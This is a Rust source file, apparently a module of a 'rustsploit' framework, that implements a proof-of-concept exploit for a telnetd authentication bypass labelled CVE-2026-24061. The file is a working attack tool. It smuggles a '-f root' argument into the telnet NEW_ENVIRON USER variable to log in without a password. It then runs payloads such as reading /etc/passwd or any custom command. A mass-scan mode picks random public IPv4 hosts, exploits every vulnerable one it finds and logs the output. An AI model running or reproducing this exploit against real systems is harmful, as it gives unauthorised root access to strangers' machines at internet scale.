use anyhow::{Result};
use colored::*;
use rand::Rng;

use std::net::{IpAddr, Ipv4Addr};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt, AsyncBufReadExt, BufReader as TokioBufReader};
use tokio::sync::Semaphore;
use tokio::sync::mpsc;
use tokio::fs::OpenOptions;
use chrono::Local;

use crate::utils::{normalize_target, prompt_default, prompt_port, prompt_yes_no};

const DEFAULT_TIMEOUT_SECS: u64 = 5;
const MASS_SCAN_CONCURRENCY: usize = 100;

// Telnet constants
const IAC: u8 = 255;
const DONT: u8 = 254;
const DO: u8 = 253;
const WONT: u8 = 252;
const WILL: u8 = 251;
const SB: u8 = 250;
const SE: u8 = 240;

const OPT_TTYPE: u8 = 24;
const OPT_TSPEED: u8 = 32;
const OPT_NEW_ENVIRON: u8 = 39;
const OPT_ECHO: u8 = 1;
const OPT_SGA: u8 = 3;

// Bogon/Private/Reserved exclusion ranges
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
    "1.1.1.1/32", "1.0.0.1/32", "8.8.8.8/32", "8.8.4.4/32",
];

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum ExploitMode {
    CheckOnly,
    ExecuteCommand,
}

#[derive(Clone, Debug)]
struct ExploitConfig {
    mode: ExploitMode,
    user: String,
    payload: String,
}

fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
    let mut rng = rand::rng();
    loop {
        let octets: [u8; 4] = rng.random();
        let ip = Ipv4Addr::from(octets);
        let ip_addr = IpAddr::V4(ip);
        if !exclusions.iter().any(|net| net.contains(ip_addr)) {
            return ip_addr;
        }
    }
}

fn display_banner() {
    println!(
        "{}",
        "╔═══════════════════════════════════════════════════════════╗".cyan()
    );
    println!(
        "{}",
        "║   GNU inetutils-telnetd Remote Authentication Bypass      ║".cyan()
    );
    println!(
        "{}",
        "║   CVE-2026-24061 - Auth Bypass via NEW_ENVIRON            ║".cyan()
    );
    println!(
        "{}",
        "║   PoC by IRIS C2 Team - Ported to Rust for rustsploit     ║".cyan()
    );
    println!(
        "{}",
        "╚═══════════════════════════════════════════════════════════╝".cyan()
    );
}

struct TelnetExploit {
    host: String,
    port: u16,
    user: String,
    payload: Option<String>,
    exploit_sent: bool,
    payload_sent: bool,
}

impl TelnetExploit {
    fn new(host: &str, port: u16, user: &str, payload: Option<String>) -> Self {
        Self {
            host: host.to_string(),
            port,
            user: user.to_string(),
            payload,
            exploit_sent: false,
            payload_sent: false,
        }
    }

    async fn handle_negotiation<W: AsyncWriteExt + Unpin>(&mut self, writer: &mut W, data: &[u8]) -> Result<Vec<u8>> {
        let mut output = Vec::new();
        let mut i = 0;

        while i < data.len() {
            if data[i] != IAC {
                output.push(data[i]);
                i += 1;
                continue;
            }

            i += 1;
            if i >= data.len() { break; }

            let cmd = data[i];
            i += 1;

            if cmd == IAC {
                output.push(255);
                continue;
            }

            if cmd == SB {
                let sb_opt = if i < data.len() { data[i] } else { 0 };
                let mut sb_data = Vec::new();
                i += 1;
                while i < data.len() - 1 {
                    if data[i] == IAC && data[i+1] == SE {
                        i += 2;
                        break;
                    }
                    sb_data.push(data[i]);
                    i += 1;
                }

                if sb_opt == OPT_TTYPE && !sb_data.is_empty() && sb_data[0] == 1 {
                    let mut payload = vec![IAC, SB, OPT_TTYPE, 0];
                    payload.extend_from_slice(b"xterm");
                    payload.extend_from_slice(&[IAC, SE]);
                    writer.write_all(&payload).await?;
                } else if sb_opt == OPT_TSPEED && !sb_data.is_empty() && sb_data[0] == 1 {
                    let mut payload = vec![IAC, SB, OPT_TSPEED, 0];
                    payload.extend_from_slice(b"38400,38400");
                    payload.extend_from_slice(&[IAC, SE]);
                    writer.write_all(&payload).await?;
                } else if sb_opt == OPT_NEW_ENVIRON && !sb_data.is_empty() && sb_data[0] == 1 {
                    if !self.exploit_sent {
                        self.send_exploit(writer).await?;
                    }
                }
                continue;
            }

            if cmd == DO || cmd == DONT || cmd == WILL || cmd == WONT {
                if i >= data.len() { break; }
                let opt = data[i];
                i += 1;

                match cmd {
                    DO => {
                        if opt == OPT_TTYPE || opt == OPT_TSPEED || opt == OPT_NEW_ENVIRON {
                            writer.write_all(&[IAC, WILL, opt]).await?;
                        } else {
                            writer.write_all(&[IAC, WONT, opt]).await?;
                        }
                    }
                    WILL => {
                        if opt == OPT_ECHO || opt == OPT_SGA {
                            writer.write_all(&[IAC, DO, opt]).await?;
                        } else {
                            writer.write_all(&[IAC, DONT, opt]).await?;
                        }
                    }
                    WONT => {
                        writer.write_all(&[IAC, DONT, opt]).await?;
                    }
                    DONT => {
                        writer.write_all(&[IAC, WONT, opt]).await?;
                    }
                    _ => {}
                }
            }
        }
        Ok(output)
    }

    async fn send_exploit<W: AsyncWriteExt + Unpin>(&mut self, writer: &mut W) -> Result<()> {
        let mut payload = vec![IAC, SB, OPT_NEW_ENVIRON, 0, 0];
        payload.extend_from_slice(b"USER");
        payload.push(1);
        payload.extend_from_slice(format!("-f {}", self.user).as_bytes());
        payload.extend_from_slice(&[IAC, SE]);
        writer.write_all(&payload).await?;
        self.exploit_sent = true;
        Ok(())
    }

    pub async fn run_exploit(&mut self, timeout_secs: u64, interactive: bool) -> Result<String> {
        let addr = format!("{}:{}", self.host, self.port);
        let stream = tokio::time::timeout(Duration::from_secs(timeout_secs), TcpStream::connect(&addr)).await??;
        
        let (reader, mut writer) = stream.into_split();
        let mut reader = TokioBufReader::new(reader);
        let mut stdin = TokioBufReader::new(tokio::io::stdin());
        let mut stdout = tokio::io::stdout();
        
        let mut buf = [0u8; 4096];
        let mut line = String::new();
        let mut command_output = String::new();

        if interactive {
            println!("{}", format!("[+] Connected to {}", addr).green());
            println!("{}", "[*] Entering interactive mode. Commands will be sent to the remote shell.".cyan());
            println!("{}", "[*] The exploit will be sent automatically during telnet negotiation.".cyan());
        }

        loop {
            tokio::select! {
                res = reader.read(&mut buf) => {
                    let n = res?;
                    if n == 0 { break; }
                    let output = self.handle_negotiation(&mut writer, &buf[..n]).await?;
                    if !output.is_empty() {
                        let text = String::from_utf8_lossy(&output);
                        if interactive {
                            stdout.write_all(&output).await?;
                            stdout.flush().await?;
                        } else {
                            command_output.push_str(&text);
                        }

                        // If we have a payload and just connected/exploited, send it once we see a prompt
                        if let Some(cmd) = &self.payload {
                            if self.exploit_sent && !self.payload_sent {
                                // Basic prompt detection (ends with # or $)
                                let trimmed = text.trim();
                                if trimmed.ends_with('#') || trimmed.ends_with('$') || trimmed.ends_with('>') {
                                    writer.write_all(format!("{}\n", cmd).as_bytes()).await?;
                                    self.payload_sent = true;
                                    if !interactive {
                                        // After sending payload in non-interactive mode, we might want to wait a bit then exit
                                    }
                                }
                            }
                        }
                    }
                }
                res = stdin.read_line(&mut line), if interactive => {
                    let n = res?;
                    if n == 0 { break; }
                    writer.write_all(line.as_bytes()).await?;
                    line.clear();
                }
                _ = tokio::time::sleep(Duration::from_secs(5)), if !interactive && self.payload_sent => {
                    // Timeout after sending payload to capture output
                    break;
                }
            }
        }
        Ok(command_output)
    }
}

async fn quick_check(ip: &str, _user: &str) -> bool {
    let addr = format!("{}:23", ip);
    match tokio::time::timeout(Duration::from_secs(5), TcpStream::connect(&addr)).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 1024];
            let _ = stream.write_all(&[IAC, WILL, OPT_NEW_ENVIRON]).await;
            match tokio::time::timeout(Duration::from_secs(3), stream.read(&mut buf)).await {
                Ok(Ok(n)) if n > 0 => {
                    for i in 0..n-2 {
                        if buf[i] == IAC && (buf[i+1] == DO || buf[i+1] == SB) && buf[i+2] == OPT_NEW_ENVIRON {
                            return true;
                        }
                    }
                }
                _ => {}
            }
            false
        }
        _ => false,
    }
}

async fn prompt_exploit_config() -> Result<ExploitConfig> {
    println!("{}", "\n[Operation Mode]".bold().cyan());
    println!("  1. Just Vulnerability Check (Safe)");
    println!("  2. Execute Command Payload (Unsafe)");
    let choice = prompt_default("Select mode [1-2]", "1").await?;
    
    let mode = if choice == "2" { ExploitMode::ExecuteCommand } else { ExploitMode::CheckOnly };
    
    let mut payload = String::new();
    if mode == ExploitMode::ExecuteCommand {
        println!("{}", "\n[Payload Menu]".bold().cyan());
        println!("  1. Basic Info (id; whoami; uname -a)");
        println!("  2. Read /etc/passwd");
        println!("  3. List Root Directory (ls -la /)");
        println!("  4. Custom Command");
        let p_choice = prompt_default("Select payload [1-4]", "1").await?;
        
        payload = match p_choice.as_str() {
            "1" => "id; whoami; uname -a".to_string(),
            "2" => "cat /etc/passwd".to_string(),
            "3" => "ls -la /".to_string(),
            "4" => {
                print!("{}", "Enter custom command: ".green());
                std::io::Write::flush(&mut std::io::stdout())?;
                let mut input = String::new();
                std::io::stdin().read_line(&mut input)?;
                input.trim().to_string()
            }
            _ => "id; whoami; uname -a".to_string(),
        };
    }

    let user = prompt_default("Username to bypass as", "root").await?;

    Ok(ExploitConfig { mode, user, payload })
}

async fn run_mass_scan(config: ExploitConfig) -> Result<()> {
    display_banner();
    println!("{}", "[*] Mass Scan Mode: 0.0.0.0/0".yellow().bold());
    println!("{}", format!("[*] Mode: {:?}", config.mode).cyan());
    if config.mode == ExploitMode::ExecuteCommand {
        println!("{}", format!("[*] Payload: {}", config.payload).cyan());
    }
    
    let use_exclusions = prompt_yes_no("[?] Exclude reserved/private ranges?", true).await?;
    let mut exclusions = Vec::new();
    if use_exclusions {
        for cidr in EXCLUDED_RANGES {
            if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
                exclusions.push(net);
            }
        }
    }
    let exclusions = Arc::new(exclusions);

    let outfile = prompt_default("[?] Output File", "telnet_exploit_hits.txt").await?;
    let outfile = Arc::new(outfile);

    let threads = prompt_default("[?] Concurrency", &MASS_SCAN_CONCURRENCY.to_string()).await?
        .parse().unwrap_or(MASS_SCAN_CONCURRENCY);

    let semaphore = Arc::new(Semaphore::new(threads));
    let checked = Arc::new(AtomicUsize::new(0));
    let found = Arc::new(AtomicUsize::new(0));

    let (tx, mut rx) = mpsc::unbounded_channel::<String>();
    
    let outfile_clone = outfile.clone();
    tokio::spawn(async move {
        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&*outfile_clone)
            .await
            .expect("Failed to open output file");
            
        while let Some(result) = rx.recv().await {
            let _ = file.write_all(result.as_bytes()).await;
        }
    });

    let c = checked.clone();
    let f = found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(10)).await;
            println!("[*] Checked: {} | Found: {}", c.load(Ordering::Relaxed), f.load(Ordering::Relaxed));
        }
    });

    println!("{}", "[*] Starting mass scan... Press Ctrl+C to stop.".cyan());

    let config = Arc::new(config);

    loop {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let exc = exclusions.clone();
        let chk = checked.clone();
        let fnd = found.clone();
        let tx = tx.clone();
        let cfg = config.clone();

        tokio::spawn(async move {
            let ip = generate_random_public_ip(&exc).to_string();
            let is_vuln = quick_check(&ip, &cfg.user).await;
            
            if is_vuln {
                println!("{}", format!("[+] VULNERABLE: {}", ip).green().bold());
                fnd.fetch_add(1, Ordering::Relaxed);
                
                let mut log_entry = format!("[{}] {} - VULNERABLE\n", Local::now().format("%Y-%m-%d %H:%M:%S"), ip);
                
                if cfg.mode == ExploitMode::ExecuteCommand {
                    let mut exploit = TelnetExploit::new(&ip, 23, &cfg.user, Some(cfg.payload.clone()));
                    if let Ok(output) = exploit.run_exploit(5, false).await {
                        log_entry.push_str(&format!("Payload: {}\nOutput:\n{}\n", cfg.payload, output));
                    }
                }
                
                let _ = tx.send(log_entry);
            }
            chk.fetch_add(1, Ordering::Relaxed);
            drop(permit);
        });
    }
}

pub async fn run(target: &str) -> Result<()> {
    if target == "0.0.0.0" || target == "0.0.0.0/0" || target == "random" || target.is_empty() {
        let config = prompt_exploit_config().await?;
        run_mass_scan(config).await
    } else {
        display_banner();
        let normalized = normalize_target(target).unwrap_or(target.to_string());
        println!("{}", format!("[*] Target: {}", normalized).yellow());

        let port = prompt_port("Telnet Port", 23).await?;
        let config = prompt_exploit_config().await?;

        if config.mode == ExploitMode::CheckOnly {
            if quick_check(target, &config.user).await {
                println!("{}", "[+] Target is VULNERABLE".green().bold());
            } else {
                println!("{}", "[-] Target is NOT VULNERABLE or could not be verified".red());
            }
        } else {
            let mut exploit = TelnetExploit::new(target, port, &config.user, None);
            exploit.run_exploit(DEFAULT_TIMEOUT_SECS, true).await?;
        }
        Ok(())
    }
}
